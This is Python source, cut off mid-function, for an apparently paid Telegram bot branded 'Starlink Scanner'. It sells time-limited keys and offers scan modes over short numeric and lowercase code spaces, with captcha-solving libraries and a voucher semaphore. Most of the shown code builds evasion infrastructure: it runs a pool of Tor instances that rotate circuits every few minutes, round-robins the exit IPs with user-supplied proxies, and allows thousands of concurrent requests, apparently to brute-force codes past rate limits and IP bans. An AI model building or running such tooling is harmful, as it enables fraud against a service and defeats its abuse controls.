import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2
import ddddocr
import numpy as np
from urllib.parse import urlparse
from datetime import datetime, timedelta, timezone

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
REPO_OWNER = os.environ.get('REPO_OWNER', '')
REPO_NAME = os.environ.get('REPO_NAME', '')
PROXY_FILE = os.environ.get('PROXY_FILE', 'proxies.json')
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
menu_state = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}
session = None
_connector = None
_tor_connectors = []
_custom_proxy_urls = []
_tor_processes = []
_tor_rr = 0
TOR_POOL_SIZE = 5
MAX_CONCURRENCY = 3000
CONCURRENCY = 3000
_voucher_sem = None
_start_time = time.monotonic()
proxy_enabled = False
_auto_rotate_task = None
AUTO_ROTATE_INTERVAL = 360
_background_tasks = set()
_github_lock = asyncio.Lock()


def _log_background_task_result(task):
    _background_tasks.discard(task)
    try:
        task.result()
    except asyncio.CancelledError:
        pass
    except Exception as exc:
        print(f"[background-task] error: {type(exc).__name__}: {exc}")


def _schedule_background(coro):
    task = asyncio.create_task(coro)
    _background_tasks.add(task)
    task.add_done_callback(_log_background_task_result)
    return task

async def auto_rotate_loop():
    while proxy_enabled and _tor_processes:
        await asyncio.sleep(AUTO_ROTATE_INTERVAL)
        if not proxy_enabled:
            break
        await rotate_tor()
        print(f"[auto-rotate] Rotated all {len(_tor_processes)} Tor circuits")

def _start_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = asyncio.create_task(auto_rotate_loop())

def _stop_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = None

def _next_tor_connector():
    global _tor_rr
    if not _tor_connectors:
        return _connector
    c = _tor_connectors[_tor_rr % len(_tor_connectors)]
    _tor_rr = (_tor_rr + 1) % len(_tor_connectors)
    return c

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session(use_proxy=False, socks_ports=None, proxy_urls=None):
    global session, _connector, _tor_connectors
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    for c in _tor_connectors:
        if not c.closed:
            await c.close()
    _tor_connectors.clear()
    timeout = aiohttp.ClientTimeout(total=30)
    proxy_urls = list(proxy_urls or [])
    if use_proxy:
        if socks_ports:
            _tor_connectors.extend(
                ProxyConnector.from_url(
                    f'socks5://127.0.0.1:{p}',
                    rdns=True, limit=2000, ssl=False
                )
                for p in socks_ports
            )
        if proxy_urls:
            _tor_connectors.extend(
                ProxyConnector.from_url(
                    proxy_url,
                    rdns=True, limit=2000, ssl=False,
                )
                for proxy_url in proxy_urls
            )
    if _tor_connectors:
        _connector = _tor_connectors[0]
    else:
        _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def _drain_stdout(proc, idx):
    if proc and proc.stdout:
        try:
            async for _ in proc.stdout:
                pass
        except Exception:
            pass

async def _start_one_tor(i):
    socks_port = 9050 + i * 2
    ctrl_port  = 9051 + i * 2
    data_dir   = f"/tmp/tor_bot_{i}"
    os.makedirs(data_dir, exist_ok=True)
    torrc = (
        f"SocksPort {socks_port}\n"
        f"ControlPort {ctrl_port}\n"
        f"DataDirectory {data_dir}\n"
        "CookieAuthentication 0\n"
        "Log notice stdout\n"
        "MaxCircuitDirtiness 10\n"
    )
    torrc_path = f"/tmp/torrc_bot_{i}"
    with open(torrc_path, "w") as f:
        f.write(torrc)
    proc = await asyncio.create_subprocess_exec(
        'tor', '-f', torrc_path,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )
    print(f"[tor-{i}] Starting on socks={socks_port} ctrl={ctrl_port}...")
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=10)
        except asyncio.TimeoutError:
            continue
        if not line:
            print(f"[tor-{i}] process ended unexpectedly")
            return None
        line_str = line.decode(errors='replace').strip()
        print(f"[tor-{i}] {line_str}")
        if "Bootstrapped 100%" in line_str:
            print(f"[tor-{i}] Bootstrapped successfully on port {socks_port}")
            asyncio.create_task(_drain_stdout(proc, i))
            return proc
    print(f"[tor-{i}] Bootstrap timed out")
    return None

async def _kill_all_tor():
    for p in _tor_processes:
        try:
            if p.returncode is None:
                p.kill()
        except Exception:
            pass
    await asyncio.gather(*[
        p.wait() for p in _tor_processes if p.returncode is None
    ], return_exceptions=True)
    for cmd in [['pkill', '-9', 'tor'], ['pkill', '-9', '-f', 'torrc_bot']]:
        try:
            kp = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await kp.wait()
        except Exception:
            pass
    for i in range(20):
        lock = f"/tmp/tor_bot_{i}/lock"
        try:
            os.remove(lock)
        except FileNotFoundError:
            pass
    await asyncio.sleep(2)

async def start_tor_pool(n=None):
    global _tor_processes
    if n is None:
        n = TOR_POOL_SIZE
    await _kill_all_tor()
    _tor_processes.clear()
    results = await asyncio.gather(*[_start_one_tor(i) for i in range(n)])
    _tor_processes.extend(p for p in results if p is not None)
    print(f"[tor] Pool started: {len(_tor_processes)}/{n} instances up")
    return len(_tor_processes) > 0

async def rotate_tor():
    async def _rotate_one(ctrl_port):
        try:
            _, writer = await asyncio.open_connection('127.0.0.1', ctrl_port)
            writer.write(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n')
            await writer.drain()
            await asyncio.sleep(0.5)
            writer.close()
            await writer.wait_closed()
            return True
        except Exception as e:
            print(f"[tor] rotate error ctrl={ctrl_port}: {e}")
            return False
    ctrl_ports = [9051 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[_rotate_one(p) for p in ctrl_ports])
    return any(results)

async def get_current_ip():
    try:
        async with session.get('https://api.ipify.org?format=json') as r:
            data = await r.json()
            return data.get('ip', 'unknown')
    except Exception as e:
        print(f"[get_current_ip] {e}")
        return 'unknown'

async def get_ip_via_port(socks_port):
    try:
        conn = ProxyConnector.from_url(
            f'socks5://127.0.0.1:{socks_port}', rdns=True, ssl=False
        )
        async with aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as s:
            async with s.get('https://api.ipify.org?format=json') as r:
                data = await r.json()
                return data.get('ip', 'unknown')
    except Exception as e:
        return f'error'

async def get_all_proxy_ips():
    ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[get_ip_via_port(p) for p in ports])
    return list(zip(ports, results))


@bot.message_handler(commands=['addproxy'])
async def add_proxy(message):
    global proxy_enabled

    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n/addproxy socks5://host:port\n"
            "or\n/addproxy http://user:password@host:port",
        )
        return

    if any(
        data.get("task")
        and not data["task"].done()
        for data in scan_tasks.values()
    ):
        await bot.reply_to(
            message,
            "လက်ရှိ scan လုပ်နေပါသည်။ Proxy အသစ်ထည့်ရန် scan ကို အရင်ရပ်ပါ။",
        )
        return

    raw_proxy_input = args[1].strip()
    proxy_urls = list(dict.fromkeys(
        item.strip()
        for item in re.split(r"[\s,]+", raw_proxy_input)
        if item.strip()
    ))
    if not proxy_urls:
        await bot.reply_to(message, "Proxy URL မတွေ့ပါ။")
        return
    if len(proxy_urls) > 100:
        await bot.reply_to(message, "တစ်ခါလျှင် Proxy 100 ခုအထိသာ ထည့်နိုင်ပါသည်။")
        return

    testing_message = await bot.reply_to(
        message,
        f"⏳ Proxy {len(proxy_urls)} ခုကို စစ်ဆေးနေပါသည်...\n"
        "အောင်မြင်တဲ့ proxy တွေကိုသာ သိမ်းဆည်းပေးပါမယ်။",
    )

    allowed_schemes = {"http", "socks4", "socks5", "socks5h"}

    async def test_proxy(proxy_url):
        parsed = urlparse(proxy_url)
        try:
            parsed_port = parsed.port
        except ValueError:
            return proxy_url, None, "invalid-port"
        if (
            parsed.scheme.lower() not in allowed_schemes
            or not parsed.hostname
            or not parsed_port
        ):
            return proxy_url, None, "invalid-format"

        test_connector = None
        try:
            test_connector = ProxyConnector.from_url(
                proxy_url,
                rdns=True,
                limit=100,
                ssl=False,
            )
            async with aiohttp.ClientSession(
                connector=test_connector,
                connector_owner=True,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as test_session:
                async with test_session.get(
                    "https://api.ipify.org?format=json"
                ) as response:
                    if response.status != 200:
                        return proxy_url, None, f"http-{response.status}"
                    ip_data = await response.json(content_type=None)
                    return proxy_url, ip_data.get("ip", "unknown"), None
        except Exception as exc:
            return proxy_url, None, type(exc).__name__
        finally:
            if test_connector and not test_connector.closed:
                await test_connector.close()

    test_sem = asyncio.Semaphore(10)

    async def bounded_test(proxy_url):
        async with test_sem:
            return await test_proxy(proxy_url)

    tested = await asyncio.gather(
        *(bounded_test(proxy_url) for proxy_url in proxy_urls)
    )
    working = [
        (proxy_url, proxy_ip)
        for proxy_url, proxy_ip, error in tested
        if proxy_ip
        and proxy_url not in _custom_proxy_urls
    ]
    failed = [
        (proxy_url, error)
        for proxy_url, proxy_ip, error in tested
        if not proxy_ip
    ]

    if working:
        new_urls = _custom_proxy_urls + [proxy_url for proxy_url, _ in working]
        github_saved, github_error = await save_custom_proxies(new_urls)
        socks_ports = [9050 + i * 2 for i in range(len(_tor_processes))]
        await rebuild_session(
            use_proxy=True,
            socks_ports=socks_ports,
            proxy_urls=new_urls,
        )
        _custom_proxy_urls[:] = new_urls
        proxy_enabled = True
        _start_auto_rotate()

    lines = [
        f"✅ အလုပ်လုပ်တဲ့ Proxy: {len(working)} ခု",
        f"📦 စုစုပေါင်း အောင်မြင်တဲ့ Custom Proxy: {len(_custom_proxy_urls)} ခု",
    ]
    if working:
        if github_saved:
            lines.append(f"☁️ GitHub သိမ်းဆည်းမှု: ✅ {PROXY_FILE}")
        else:
            lines.append(f"☁️ GitHub သိမ်းဆည်းမှု: ⚠️ {github_error}")
    if working:
        lines.append("\n🌐 အောင်မြင်တဲ့ Proxy များ:")
        lines.extend(
            f"• {_proxy_label(proxy_url)} → {proxy_ip}"
            for proxy_url, proxy_ip in working
        )
    result_text = "\n".join(lines)[:3900]
    try:
        await bot.edit_message_text(
            result_text,
            message.chat.id,
            testing_message.message_id,
            reply_markup=build_proxy_menu(),
        )
    except Exception:
        await bot.reply_to(
            message,
            result_text,
            reply_markup=build_proxy_menu(),
        )
    await bot.send_message(
        message.chat.id,
        build_main_menu_text(message.chat.id),
        reply_markup=build_main_menu(message.chat.id),
    )


@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    global proxy_enabled
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission — Proxy ကို Admin သာအသုံးပြုနိုင်ပါသည်။")
        return
    args = message.text.split()

    # /proxy rotate — rotate all circuits, show all new IPs
    if len(args) > 1 and args[1].lower() == 'rotate':
        if not proxy_enabled:
            await bot.reply_to(message, "❌ Proxy မဖွင့်ရသေးပါ။ 🌐 Proxy menu မှ instance တစ်ခုရွေးပါ။")
            return
        ok = await rotate_tor()
        if ok:
            await asyncio.sleep(2)
            ip_pairs = await get_all_proxy_ips()
            lines = "\n".join(f"  #{i+1} (:{p}): {ip}" for i, (p, ip) in enumerate(ip_pairs))
            await bot.reply_to(message, f"🔄 Rotated {len(_tor_processes)} circuits\n\n🌐 New IPs:\n{lines}")
        else:
            await bot.reply_to(message, "❌ Circuit rotate မအောင်မြင်ပါ။")
        return

    # /proxy — no number, proxy already ON → turn off
    if proxy_enabled and (len(args) < 2 or not args[1].isdigit()):
        _stop_auto_rotate()
        await rebuild_session(use_proxy=False)
        proxy_enabled = False
        ip = await get_current_ip()
        await bot.reply_to(message, f"✅ Tor Proxy ပိတ်ပြီးပါပြီ!\n🌐 Direct IP: {ip}")
        return

    # /proxy <n> — start N instances (or restart with new count)
    count = int(args[1]) if len(args) > 1 and args[1].isdigit() else TOR_POOL_SIZE
    if count < 1 or count > 10:
        await bot.reply_to(message, "❌ Instance count must be between 1 and 10")
        return

    # If already on, shut down first
    if proxy_enabled:
        _stop_auto_rotate()
        await rebuild_session(use_proxy=False)
        proxy_enabled = False

    msg = await bot.reply_to(
        message,
        f"⏳ Starting {count} Tor instance(s) in parallel...\n"
        f"(each bootstraps separately, may take ~2 min)"
    )
    ok = await start_tor_pool(count)
    if not ok:
        await bot.edit_message_text("❌ Tor startup မအောင်မြင်ပါ။", message.chat.id, msg.message_id)
        return

    socks_ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    await rebuild_session(
        use_proxy=True,
        socks_ports=socks_ports,
        proxy_urls=_custom_proxy_urls,
    )
    proxy_enabled = True
    _start_auto_rotate()

    # Fetch IP for every instance simultaneously
    ip_pairs = await get_all_proxy_ips()
    ip_lines = "\n".join(f"  #{i+1} (port {p}): {ip}" for i, (p, ip) in enumerate(ip_pairs))
    await bot.edit_message_text(
        f"✅ Tor Proxy Pool Ready!\n"
        f"🔀 Active instances: {len(_tor_processes)}/{count}\n\n"
        f"🌐 Exit IPs — all used simultaneously (round-robin):\n{ip_lines}\n\n"
        f"🔁 Auto-rotate: every 3 min (all IPs change automatically)\n"
        f"🔄 Manual rotate: Proxy menu မှ Rotate\n"
        f"🔴 Turn off: Proxy menu မှ Turn Off",
        message.chat.id, msg.message_id
    )

async def get_file_content(path):
    content, sha, _ = await _get_github_file_content(path)
    return content, sha


async def _get_github_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
    }
    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
        return {}, None, 0

    # GitHub operations must not depend on a newly-added custom proxy.
    # Otherwise a bad proxy can prevent the proxy list from being saved.
    try:
        connector = aiohttp.TCPConnector(limit=20, ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as github_session:
            async with github_session.get(url, headers=headers) as response:
                status = response.status
                if status == 200:
                    data = await response.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha'], status
                error_text = await response.text()
                print(f"[github] GET {path} failed: {status} {error_text[:500]}")
                return {}, None, status
    except Exception as exc:
        print(f"[github] GET {path} error: {type(exc).__name__}: {exc}")
        return {}, None, 0

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
        "Content-Type": "application/json",
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
    }
    # sha is required for an existing file, but must be omitted when
    # creating proxies.json for the first time.
    if sha:
        payload["sha"] = sha

    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
        return 0, "GitHub environment variables are missing"

    try:
        connector = aiohttp.TCPConnector(limit=20, ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as github_session:
            async with github_session.put(url, headers=headers, json=payload) as response:
                response_text = await response.text()
                if response.status not in (200, 201):
                    print(
                        f"[github] PUT {path} failed: "
                        f"{response.status} {response_text[:500]}"
                    )
                return response.status, response_text
    except Exception as exc:
        print(f"[github] PUT {path} error: {type(exc).__name__}: {exc}")
        return 0, str(exc)


async def save_custom_proxies(proxy_urls):
    """Persist custom proxies in GitHub and return (success, error_message)."""
    async with _github_lock:
        current, sha, status = await _get_github_file_content(PROXY_FILE)
        if status not in (200, 404):
            return False, f"GitHub ဖတ်မရပါ ({status or 'connection error'})"

        if isinstance(current, dict):
            old_urls = current.get("proxies", [])
            content = dict(current)
            content["proxies"] = list(dict.fromkeys(
                [url for url in old_urls if isinstance(url, str)]
                + list(proxy_urls)
            ))
        else:
            old_urls = current if isinstance(current, list) else []
            content = list(dict.fromkeys(
                [url for url in old_urls if isinstance(url, str)]
                + list(proxy_urls)
            ))

        saved_status, response_text = await update_file_content(
            PROXY_FILE,
            content,
            sha if status == 200 else None,
            "Update proxy list from Telegram bot",
        )
        if saved_status in (200, 201):
            return True, ""
        return False, f"GitHub update မအောင်မြင်ပါ ({saved_status or response_text[:120]})"


async def load_custom_proxies():
    current, _, status = await _get_github_file_content(PROXY_FILE)
    if status == 404:
        return []
    if status != 200:
        print(f"[github] Could not load {PROXY_FILE}: status={status}")
        return []
    if isinstance(current, dict):
        current = current.get("proxies", [])
    if not isinstance(current, list):
        print(f"[github] {PROXY_FILE} must contain a JSON list or a 'proxies' list")
        return []
    return list(dict.fromkeys(url for url in current if isinstance(url, str) and url))

def build_main_menu(chat_id):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton(
            "🔑 Activate Key", callback_data="menu:key"
        ),
        telebot.types.InlineKeyboardButton(
            "📥 Input Session", callback_data="menu:input"
        ),
        telebot.types.InlineKeyboardButton(
            "🔍 Start Scan", callback_data="menu:scan"
        ),
        telebot.types.InlineKeyboardButton(
            "🎫 Results", callback_data="menu:result"
        ),
        telebot.types.InlineKeyboardButton(
            "🔄 Recheck", callback_data="menu:recheck"
        ),
        telebot.types.InlineKeyboardButton(
            "⛔ Stop Scan", callback_data="menu:stop"
        ),
    )
    if str(chat_id) == ADMIN_ID:
        markup.add(
            telebot.types.InlineKeyboardButton(
                "🛠 Admin Panel", callback_data="admin:panel"
            ),
        )
    return markup


def _proxy_label(proxy_url):
    parsed = urlparse(proxy_url)
    scheme = parsed.scheme.lower() or "proxy"
    host = parsed.hostname or "unknown-host"
    try:
        port = parsed.port
    except ValueError:
        port = "?"
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{scheme}://{host}:{port}"


SCAN_MODE_NAMES = {
    "6": "Number 6",
    "7": "Number 7",
    "8": "Number 8",
    "ascii-lower": "ASCII Lower",
    "all": "Mix 6",
}


def build_main_menu_text(chat_id=None):
    proxy_total = len(_tor_processes) + len(_custom_proxy_urls)
    active_proxy_count = len(_tor_connectors) if proxy_enabled else 0
    selected_mode = "Not Selected"
    current_key = "Not Activated"
    if chat_id is not None:
        current_user_data = user_data.get(chat_id, {})
        selected_mode = SCAN_MODE_NAMES.get(
            current_user_data.get("mode"),
            "Not Selected",
        )
        current_key = current_user_data.get("key", "Not Activated")
    return (
        "⚡ Starlink Scanner Control Panel ⚡\n"
        "BY Telegram 👉👉 ဘိုပိုင် @K_Paing2025\n\n"
        f"🔑 Current Key: {current_key}\n"
        f"⚙️ Current Mode: {selected_mode}\n"
        f"🔀 Proxies: {active_proxy_count:02d}/{proxy_total:02d}"
    )[:3900]


def build_admin_panel():
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton(
            "➕ Generate Key", callback_data="admin:genkey"
        ),
        telebot.types.InlineKeyboardButton(
            "🗑 Delete Key", callback_data="admin:delkey"
        ),
        telebot.types.InlineKeyboardButton(
            "📋 List Keys", callback_data="admin:listkeys"
        ),
        telebot.types.InlineKeyboardButton(
            "📈 Bot Status", callback_data="admin:status"
        ),
        telebot.types.InlineKeyboardButton(
            "📡 Live Stats", callback_data="admin:stats"
        ),
        telebot.types.InlineKeyboardButton(
            "⚙ Concurrency", callback_data="admin:concurrency"
        ),
        telebot.types.InlineKeyboardButton(
            "📦 Batch Size", callback_data="admin:batch"
        ),
        telebot.types.InlineKeyboardButton(
            "🧅 Tor Pool", callback_data="admin:torpool"
        ),
        telebot.types.InlineKeyboardButton(
            "🌐 Proxy Control", callback_data="admin:proxy"
        ),
        telebot.types.InlineKeyboardButton(
            "↩ Main Menu", callback_data="menu:home"
        ),
    )
    return markup


def build_scan_menu():
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton(
            "Number 6", callback_data="scan:6"
        ),
        telebot.types.InlineKeyboardButton(
            "Number 7", callback_data="scan:7"
        ),
        telebot.types.InlineKeyboardButton(
            "Number 8", callback_data="scan:8"
        ),
    )
    markup.add(
        telebot.types.InlineKeyboardButton(
            "ASCII Lower", callback_data="scan:ascii-lower"
        ),
        telebot.types.InlineKeyboardButton(
            "Mix 6", callback_data="scan:all"
        ),
    )
    markup.add(
        telebot.types.InlineKeyboardButton(
            "↩ Back", callback_data="menu:home"
        ),
    )
    return markup


def build_scan_control_markup():
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        telebot.types.InlineKeyboardButton(
            "🛑 Scan Stop", callback_data="scanstop"
        )
    )
    return markup


def build_proxy_menu():
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        telebot.types.InlineKeyboardButton(
            "Start 1", callback_data="proxy:1"
        ),
        telebot.types.InlineKeyboardButton(
            "Start 3", callback_data="proxy:3"
        ),
        telebot.types.InlineKeyboardButton(
            "Start 5", callback_data="proxy:5"
        ),
    )
    markup.add(
        telebot.types.InlineKeyboardButton(
            "🔄 Rotate", callback_data="proxy:rotate"
        ),
        telebot.types.InlineKeyboardButton(
            "🔴 Turn Off", callback_data="proxy:off"
        ),
    )
    markup.add(
        telebot.types.InlineKeyboardButton(
            "➕ Add Proxy", callback_data="proxy:add"
        ),
    )
    markup.add(
        telebot.types.InlineKeyboardButton(
            "↩ Back", callback_data="menu:home"
        ),
    )
    return markup


def build_plan_menu():
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    for plan in ("30m", "1h", "1d", "7d", "1m", "1y", "unlimited"):
        markup.add(
            telebot.types.InlineKeyboardButton(
                plan, callback_data=f"genkeyplan:{plan}"
            )
        )
    markup.add(
        telebot.types.InlineKeyboardButton(
            "↩ Back", callback_data="menu:home"
        ),
    )
    return markup


@bot.message_handler(commands=['start', 'menu'])
async def start(message):
    await bot.reply_to(
        message,
        build_main_menu_text(message.chat.id),
        reply_markup=build_main_menu(message.chat.id),
    )


async def _edit_callback_message(message, text, reply_markup=None):
    """Replace the button message instead of creating another menu message."""
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=text,
            reply_markup=reply_markup,
        )
        return True
    except Exception as exc:
        print(f"[menu] edit error: {type(exc).__name__}: {exc}")
        return False


@bot.callback_query_handler(func=lambda call: True)
async def menu_callback(call):
    if not call.message or not call.data:
        return

    try:
        await asyncio.wait_for(bot.answer_callback_query(call.id), timeout=3)
    except Exception as exc:
        print(f"[callback] answer error: {type(exc).__name__}: {exc}")
    action = call.data
    message = call.message
    chat_id = message.chat.id

    if action == "menu:key":
        await _edit_callback_message(message, "🔑 Key ကို စစ်ဆေးနေပါသည်...")
        _schedule_background(handle_key(message, edit=True))
    elif action == "menu:input":
        menu_state[chat_id] = {"action": "input"}
        await _edit_callback_message(
            message,
            "📥 Session URL ကို ဒီ chat ထဲ တိုက်ရိုက်ပို့ပါ။\n\n"
            "URL ပို့ပြီးရင် Main Menu ပြန်ပေါ်လာပါမယ်။",
        )
    elif action == "menu:scan":
        await _edit_callback_message(
            message,
            "⚙ Choose Scanner Mode",
            reply_markup=build_scan_menu(),
        )
    elif action.startswith("scan:"):
        message.text = f"/scan {action.split(':', 1)[1]}"
        await scan(message, edit=True)
    elif action == "scanstop":
        await stop_scan(message)
    elif action == "menu:result":
        await _edit_callback_message(message, "🎫 Results ကို ဖတ်နေပါသည်...")
        _schedule_background(handle_result(message, edit=True))
    elif action == "menu:recheck":
        await _edit_callback_message(message, "🔄 Recheck လုပ်နေပါသည်...")
        _schedule_background(recheck(message, edit=True))
    elif action in ("menu:proxy", "admin:proxy"):
        if str(chat_id) != ADMIN_ID:
            await bot.send_message(chat_id, "No Permission")
            return
        await _edit_callback_message(
            message,
            "🌐 Proxy Control",
            reply_markup=build_proxy_menu(),
        )
    elif action == "admin:panel":
        if str(chat_id) != ADMIN_ID:
            await bot.send_message(chat_id, "No Permission")
            return
        await _edit_callback_message(
            message,
            "🛠 Admin Panel\n\nလုပ်ဆောင်ချက်ကို ရွေးပါ။",
            reply_markup=build_admin_panel(),
        )
    elif action == "admin:listkeys":
        await _edit_callback_message(message, "📋 Registered Keys ကို ဖတ်နေပါသည်...")
        _schedule_background(listkeys(message))
    elif action == "admin:status":
        await _edit_callback_message(message, "📈 Bot Status ကို ဖတ်နေပါသည်...")
        _schedule_background(status(message))
    elif action == "admin:stats":
        await _edit_callback_message(message, "📡 Live Stats ကို ဖတ်နေပါသည်...")
        _schedule_background(scan_stats(message))
    elif action == "admin:genkey":
        await _edit_callback_message(
            message,
            "Key plan ရွေးပါ။",
            reply_markup=build_plan_menu(),
        )
    elif action == "admin:delkey":
        menu_state[chat_id] = {"action": "delkey_user"}
        await _edit_callback_message(
            message,
            "ဖျက်မယ့် User ID ကို ဒီ chat ထဲ ပို့ပါ။",
        )
    elif action == "admin:concurrency":
        menu_state[chat_id] = {"action": "concurrency"}
        await _edit_callback_message(
            message,
            f"လက်ရှိ Concurrency: {CONCURRENCY}\nနံပါတ်အသစ်ကို ပို့ပါ။",
        )
    elif action == "admin:batch":
        menu_state[chat_id] = {"action": "batch"}
        await _edit_callback_message(
            message,
            f"လက်ရှိ Batch Size: {BATCH_SIZE}\nနံပါတ်အသစ်ကို ပို့ပါ။",
        )
    elif action == "admin:torpool":
        menu_state[chat_id] = {"action": "torpool"}
        await _edit_callback_message(
            message,
            f"လက်ရှိ Tor Pool: {TOR_POOL_SIZE}\nနံပါတ်အသစ်ကို ပို့ပါ။",
        )
    elif action == "proxy:add":
        menu_state[chat_id] = {"action": "add_proxy"}
        await _edit_callback_message(
            message,
            "➕ Proxy URL တွေကို တစ်ကြောင်းစီ ပို့ပါ။\n\n"
            "ဥပမာ - socks5://127.0.0.1:1080\n"
            "သို့မဟုတ် - http://user:password@host:port\n\n"
            "Proxy အများကြီးကို newline နဲ့ တစ်ခါတည်း paste လုပ်နိုင်ပါတယ်။",
        )
    elif action.startswith("proxy:"):
        proxy_action = action.split(":", 1)[1]
        message.text = (
            "/proxy rotate"
            if proxy_action == "rotate"
            else "/proxy"
            if proxy_action == "off"
            else f"/proxy {proxy_action}"
        )
        await _edit_callback_message(message, "🌐 Proxy လုပ်ဆောင်နေပါသည်...")
        _schedule_background(proxy_command(message))
    elif action == "menu:stop":
        await stop_scan(message)
    elif action == "menu:home":
        await _edit_callback_message(
            message,
            build_main_menu_text(chat_id),
            reply_markup=build_main_menu(chat_id),
        )
    elif action == "menu:listkeys":
        await _edit_callback_message(message, "📋 Registered Keys ကို ဖတ်နေပါသည်...")
        _schedule_background(listkeys(message))
    elif action == "menu:status":
        await _edit_callback_message(message, "📈 Bot Status ကို ဖတ်နေပါသည်...")
        _schedule_background(status(message))
    elif action == "menu:stats":
        await _edit_callback_message(message, "📡 Live Stats ကို ဖတ်နေပါသည်...")
        _schedule_background(scan_stats(message))
    elif action == "menu:genkey":
        await _edit_callback_message(
            message,
            "Key plan ရွေးပါ။",
            reply_markup=build_plan_menu(),
        )
    elif action.startswith("genkeyplan:"):
        plan = action.split(":", 1)[1]
        menu_state[chat_id] = {"action": "genkey_user", "plan": plan}
        await _edit_callback_message(
            message,
            f"Plan: {plan}\nUser ID ကို ဒီ chat ထဲ ပို့ပါ။",
        )
    elif action == "menu:delkey":
        menu_state[chat_id] = {"action": "delkey_user"}
        await _edit_callback_message(
            message,
            "ဖျက်မယ့် User ID ကို ဒီ chat ထဲ ပို့ပါ။",
        )
    elif action == "menu:concurrency":
        menu_state[chat_id] = {"action": "concurrency"}
        await _edit_callback_message(
            message,
            f"လက်ရှိ Concurrency: {CONCURRENCY}\nနံပါတ်အသစ်ကို ပို့ပါ။",
        )
    elif action == "menu:batch":
        menu_state[chat_id] = {"action": "batch"}
        await _edit_callback_message(
            message,
            f"လက်ရှိ Batch Size: {BATCH_SIZE}\nနံပါတ်အသစ်ကို ပို့ပါ။",
        )


@bot.message_handler(
    func=lambda message: (
        bool(message.text)
        and not message.text.startswith("/")
        and message.chat.id in menu_state
    )
)
async def menu_text_input(message):
    state = menu_state.pop(message.chat.id)
    action = state["action"]
    value = message.text.strip()

    if action == "input":
        message.text = f"/input {value}"
        await handle_input(message)
    elif action == "genkey_user":
        message.text = f"/genkey {state['plan']} {value}"
        await genkey(message)
    elif action == "delkey_user":
        message.text = f"/delkey {value}"
        await delkey(message)
    elif action == "concurrency":
        message.text = f"/setconcurrency {value}"
        await set_concurrency(message)
    elif action == "batch":
        message.text = f"/setbatch {value}"
        await set_batch(message)
    elif action == "torpool":
        message.text = f"/settorpool {value}"
        await set_tor_pool(message)
    elif action == "add_proxy":
        message.text = f"/addproxy {value}"
        await add_proxy(message)

@bot.message_handler(commands=['key'])
async def handle_key(message, edit=False):
    global approve

    async def respond(text, reply_markup=None):
